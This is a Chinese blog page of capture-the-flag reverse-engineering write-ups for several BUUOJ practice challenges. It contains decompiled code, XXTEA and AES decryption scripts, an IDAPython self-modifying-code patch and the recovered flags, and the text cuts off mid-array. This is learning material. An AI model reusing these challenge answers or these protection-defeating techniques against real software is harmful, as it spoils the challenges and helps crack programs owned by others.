<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/5/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://raw.githubusercontent.com/TomQunChao/avatar/main/icon00.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://raw.githubusercontent.com/TomQunChao/avatar/main/icon00.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-writeup/buuoj/wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/22/writeup/buuoj/wp/" class="article-date">
  	<time datetime="2020-10-22T02:07:17.000Z" itemprop="datePublished">2020-10-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/22/writeup/buuoj/wp/">
        buuoj writeup
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这篇博客记录buuoj上面刷题时学到东西题</p>
<h2 id="rev-红帽杯2019-xx"><a href="#rev-红帽杯2019-xx" class="headerlink" title="[rev][红帽杯2019]xx"></a>[rev][红帽杯2019]xx</h2><p>找main函数：</p>
<ol>
<li><p>有三个参数，也可能两个</p>
</li>
<li><p>下面有个函数使用了main函数的返回值</p>
</li>
</ol>
<p>根据这两个特点</p>
<p>sub1400020F中的这段代码值得注意</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    register_thread_local_exe_atexit_callback(*v12);</span><br><span class="line">  get_initial_narrow_environment(v11);</span><br><span class="line">  v14 = *(_QWORD *)_p___argv(v13);</span><br><span class="line">  v16 = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)_p___argc(v15);</span><br><span class="line">  a1 = sub_1400011A0(*v16, v14);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_140002790(v17) )</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">exit</span>(a1);</span><br></pre></td></tr></table></figure>

<p>可以看出sub_140011A0就是main</p>
<p>进入main函数分析</p>
<ol>
<li><p>最后检测逻辑</p>
<p>对某个数组进行置换并且置换之后进行了异或</p>
</li>
<li><p>再往前的变换逻辑</p>
<p>用户输入被送进了一个函数，返回值用来做检测</p>
</li>
<li><p>进入那个函数</p>
<p>看起来像tea加密(0x9E3779B9)</p>
<p>想起来加密与解密中介绍了tea的变种，网上搜索，发现是xxtea加密</p>
</li>
</ol>
<p>解密脚本</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &quot;defs.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> align4(x) (((x)&amp;3)?(x&gt;&gt;2):((x&gt;&gt;2)+1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p&lt;n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxTeaDecrypt</span><span class="params">(<span class="keyword">uint8_t</span> *cdata,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> data[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(data,cdata,<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    key[<span class="number">0</span>] = <span class="string">&#x27;f&#x27;</span>+(<span class="string">&#x27;l&#x27;</span>&lt;&lt;<span class="number">8</span>)+(<span class="string">&#x27;a&#x27;</span>&lt;&lt;<span class="number">16</span>)+(<span class="string">&#x27;g&#x27;</span>&lt;&lt;<span class="number">24</span>);</span><br><span class="line">    printArray(<span class="string">&quot;key&quot;</span>,(<span class="keyword">uint8_t</span>*)key,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    btea(data,<span class="number">-6</span>,key);</span><br><span class="line">    printArray(<span class="string">&quot;cdata&quot;</span>,(<span class="keyword">uint8_t</span> *)cdata,<span class="number">0x18</span>);</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,(<span class="keyword">uint8_t</span>*)data,<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> buf[<span class="number">0x18</span>];</span><br><span class="line">    *(<span class="keyword">int64_t</span> *)&amp;buf[<span class="number">0</span>]=<span class="number">0xC0953A7C6B40BCCE</span>LL;</span><br><span class="line">    *(<span class="keyword">int64_t</span> *)&amp;buf[<span class="number">8</span>]=<span class="number">0x3502F79120209BEF</span>LL;</span><br><span class="line">    *(<span class="keyword">int32_t</span> *)&amp;buf[<span class="number">16</span>]=<span class="number">0xC8021823</span>;</span><br><span class="line">    *(<span class="keyword">int32_t</span> *)&amp;buf[<span class="number">20</span>]=<span class="number">0xFA5656E7</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> cipher[<span class="number">0x18</span>];</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * v20=0,1,2</span></span><br><span class="line"><span class="comment">    * v20=3,4,5 buf[3,4,5]^=buf[0]^buf[1]</span></span><br><span class="line"><span class="comment">    * v20=6,7,8 buf[6,7,8]^=buf[0]^buf[1]^buf[2]</span></span><br><span class="line"><span class="comment">    * v20=9,10,11 buf[9,10,11]^=buf[0]^buf[1]^buf[2]^buf[3]</span></span><br><span class="line"><span class="comment">    * ...</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0x18</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i/<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">uint8_t</span> j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                buf[i]^=buf[j];</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">while</span>(j&lt;i/<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cipher[<span class="number">2</span>]=buf[<span class="number">0</span>];</span><br><span class="line">    cipher[<span class="number">0</span>]=buf[<span class="number">1</span>];</span><br><span class="line">    cipher[<span class="number">3</span>]=buf[<span class="number">2</span>];</span><br><span class="line">    cipher[<span class="number">1</span>]=buf[<span class="number">3</span>];</span><br><span class="line">    cipher[<span class="number">6</span>]=buf[<span class="number">4</span>];</span><br><span class="line">    cipher[<span class="number">4</span>]=buf[<span class="number">5</span>];</span><br><span class="line">    cipher[<span class="number">7</span>]=buf[<span class="number">6</span>];</span><br><span class="line">    cipher[<span class="number">5</span>]=buf[<span class="number">7</span>];</span><br><span class="line">    cipher[<span class="number">10</span>]=buf[<span class="number">8</span>];</span><br><span class="line">    cipher[<span class="number">8</span>]=buf[<span class="number">9</span>];</span><br><span class="line">    cipher[<span class="number">11</span>]=buf[<span class="number">10</span>];</span><br><span class="line">    cipher[<span class="number">9</span>]=buf[<span class="number">11</span>];</span><br><span class="line">    cipher[<span class="number">14</span>]=buf[<span class="number">12</span>];</span><br><span class="line">    cipher[<span class="number">12</span>]=buf[<span class="number">13</span>];</span><br><span class="line">    cipher[<span class="number">15</span>]=buf[<span class="number">14</span>];</span><br><span class="line">    cipher[<span class="number">13</span>]=buf[<span class="number">15</span>];</span><br><span class="line">    cipher[<span class="number">18</span>]=buf[<span class="number">16</span>];</span><br><span class="line">    cipher[<span class="number">16</span>]=buf[<span class="number">17</span>];</span><br><span class="line">    cipher[<span class="number">19</span>]=buf[<span class="number">18</span>];</span><br><span class="line">    cipher[<span class="number">17</span>]=buf[<span class="number">19</span>];</span><br><span class="line">    cipher[<span class="number">22</span>]=buf[<span class="number">20</span>];</span><br><span class="line">    cipher[<span class="number">20</span>]=buf[<span class="number">21</span>];</span><br><span class="line">    cipher[<span class="number">23</span>]=buf[<span class="number">22</span>];</span><br><span class="line">    cipher[<span class="number">21</span>]=buf[<span class="number">23</span>];</span><br><span class="line">    <span class="comment">// printArray(&quot;cipher&quot;,cipher,0x18);</span></span><br><span class="line">    xxTeaDecrypt(cipher,<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;CXX_and_++tea&#125;</code></p>
<h2 id="rev-GWCTF-2019-re3"><a href="#rev-GWCTF-2019-re3" class="headerlink" title="[rev][GWCTF 2019]re3"></a>[rev][GWCTF 2019]re3</h2><ol>
<li><p>进入main函数，发现mprotect和SMC(自修改代码)逻辑，使用idapython进行patch</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">st=<span class="number">0x402219</span></span><br><span class="line">end=st+<span class="number">223</span></span><br><span class="line"><span class="keyword">while</span> st&lt;=end:</span><br><span class="line">    c=Byte(st)</span><br><span class="line">    PatchByte(st,(c^<span class="number">0x99</span>))</span><br><span class="line">    st+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>进入sub_402219，找到比对逻辑</p>
<p>0xbc 0xa 0xad 0xc0 0x14 0x7c 0x5e 0xcc 0xe0 0xb1 0x40 0xbc 0x9c 0x51 0xd5 0x2b 0x46 0xb2 0xb9 0x43 0x4d 0xe5 0x32 0x4b 0xad 0x7f 0xb4 0xb3 0x9c 0xdb 0x4b 0x5b</p>
</li>
<li><p>重点在于sub_40196E</p>
<p>这里用到了一个全局变量unk_603170</p>
<ol>
<li><p>sub_400B0A逐字节异或从0开始，共16轮</p>
</li>
<li><p>进行替换，替换表为byte_4023A0</p>
<p>0x63 0x7c 0x77 0x7b 0xf2 0x6b 0x6f 0xc5 0x30 0x1 0x67 0x2b 0xfe 0xd7 0xab 0x76 0xca 0x82 0xc9 0x7d 0xfa 0x59 0x47 0xf0 0xad 0xd4 0xa2 0xaf 0x9c 0xa4 0x72 0xc0 0xb7 0xfd 0x93 0x26 0x36 0x3f 0xf7 0xcc 0x34 0xa5 0xe5 0xf1 0x71 0xd8 0x31 0x15 0x4 0xc7 0x23 0xc3 0x18 0x96 0x5 0x9a 0x7 0x12 0x80 0xe2 0xeb 0x27 0xb2 0x75 0x9 0x83 0x2c 0x1a 0x1b 0x6e 0x5a 0xa0 0x52 0x3b 0xd6 0xb3 0x29 0xe3 0x2f 0x84 0x53 0xd1 0x0 0xed 0x20 0xfc 0xb1 0x5b 0x6a 0xcb 0xbe 0x39 0x4a 0x4c 0x58 0xcf 0xd0 0xef 0xaa 0xfb 0x43 0x4d 0x33 0x85 0x45 0xf9 0x2 0x7f 0x50 0x3c 0x9f 0xa8 0x51 0xa3 0x40 0x8f 0x92 0x9d 0x38 0xf5 0xbc 0xb6 0xda 0x21 0x10 0xff 0xf3 0xd2 0xcd 0xc 0x13 0xec 0x5f 0x97 0x44 0x17 0xc4 0xa7 0x7e 0x3d 0x64 0x5d 0x19 0x73 0x60 0x81 0x4f 0xdc 0x22 0x2a 0x90 0x88 0x46 0xee 0xb8 0x14 0xde 0x5e 0xb 0xdb 0xe0 0x32 0x3a 0xa 0x49 0x6 0x24 0x5c 0xc2 0xd3 0xac 0x62 0x91 0x95 0xe4 0x79 0xe7 0xc8 0x37 0x6d 0x8d 0xd5 0x4e 0xa9 0x6c 0x56 0xf4 0xea 0x65 0x7a 0xae 0x8 0xba 0x78 0x25 0x2e 0x1c 0xa6 0xb4 0xc6 0xe8 0xdd 0x74 0x1f 0x4b 0xbd 0x8b 0x8a 0x70 0x3e 0xb5 0x66 0x48 0x3 0xf6 0xe 0x61 0x35 0x57 0xb9 0x86 0xc1 0x1d 0x9e 0xe1 0xf8 0x98 0x11 0x69 0xd9 0x8e 0x94 0x9b 0x1e 0x87 0xe9 0xce 0x55 0x28 0xdf 0x8c 0xa1 0x89 0xd 0xbf 0xe6 0x42 0x68 0x41 0x99 0x2d 0xf 0xb0 0x54 0xbb 0x16</p>
</li>
<li><p>sub_400C1F进行置换 置换表</p>
<p>[0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12, 1, 6, 11]</p>
</li>
<li><p>sub_400D27自异或操作</p>
<p>v1=s[i*4]</p>
<p>v2=s[i<em>4+1]^s[i</em>4+2]^s[i*4+3]</p>
<p>sub_400CFA 2<em>x^27\</em>(x&gt;&gt;7)</p>
<p>s[i<em>4]=v2^sub_400CFA(s[i</em>4]^s[i*4+1])</p>
<p>s[i*4+1]=v2^sub_400CFA(+1,+2)</p>
<p>s[2]=v2^sub(+2,+3)</p>
<p>s[3]=v2^sub(+3)</p>
</li>
<li><p>再进行异或</p>
</li>
<li><p>循环结束，9轮</p>
</li>
<li><p>替换</p>
</li>
<li><p>置换</p>
</li>
<li><p>异或</p>
</li>
</ol>
<p>看下来是AES加密算法，555我爬了</p>
<p>ECB模式，密钥可以调试获得</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0xcb</span>,<span class="number">0x8d</span>,<span class="number">0x49</span>,<span class="number">0x35</span>,<span class="number">0x21</span>,<span class="number">0xb4</span>,<span class="number">0x7a</span>,<span class="number">0x4c</span>,<span class="number">0xc1</span>,<span class="number">0xae</span>,<span class="number">0x7e</span>,<span class="number">0x62</span>,<span class="number">0x22</span>,<span class="number">0x92</span>,<span class="number">0x66</span>,<span class="number">0xce</span>]</span><br><span class="line">key = bytes(key)</span><br><span class="line">cipher = [<span class="number">0xbc</span>,<span class="number">0xa</span>,<span class="number">0xad</span>,<span class="number">0xc0</span>,<span class="number">0x14</span>,<span class="number">0x7c</span>,<span class="number">0x5e</span>,<span class="number">0xcc</span>,<span class="number">0xe0</span>,<span class="number">0xb1</span>,<span class="number">0x40</span>,<span class="number">0xbc</span>,<span class="number">0x9c</span>,<span class="number">0x51</span>,<span class="number">0xd5</span>,<span class="number">0x2b</span>,<span class="number">0x46</span>,<span class="number">0xb2</span>,<span class="number">0xb9</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0xe5</span>,<span class="number">0x32</span>,<span class="number">0x4b</span>,<span class="number">0xad</span>,<span class="number">0x7f</span>,<span class="number">0xb4</span>,<span class="number">0xb3</span>,<span class="number">0x9c</span>,<span class="number">0xdb</span>,<span class="number">0x4b</span>,<span class="number">0x5b</span>]</span><br><span class="line">cipher = bytes(cipher)</span><br><span class="line">aes = AES.new(mode=AES.MODE_ECB,key=key)</span><br><span class="line">print(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="rev-ACTF新生赛2020-Oruga"><a href="#rev-ACTF新生赛2020-Oruga" class="headerlink" title="[rev][ACTF新生赛2020]Oruga"></a>[rev][ACTF新生赛2020]Oruga</h2><p>迷宫问题</p>
<p>规则：</p>
<ol>
<li><p>WEMJ分别代表上右下左</p>
</li>
<li><p>如果上次的方向是上，这次还是上，则改为右，以此类推</p>
</li>
<li><p>如果当前的位置是0，则一直沿同一方向向前走直到越界或不是0</p>
<p>如果遇到非0，则停在非0单位面前</p>
</li>
<li><p>最终走到0x21的位置，初始位置是0</p>
</li>
</ol>
<p>actf{MEWEMEWJMEWJM}</p>
<p>打印迷宫函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span 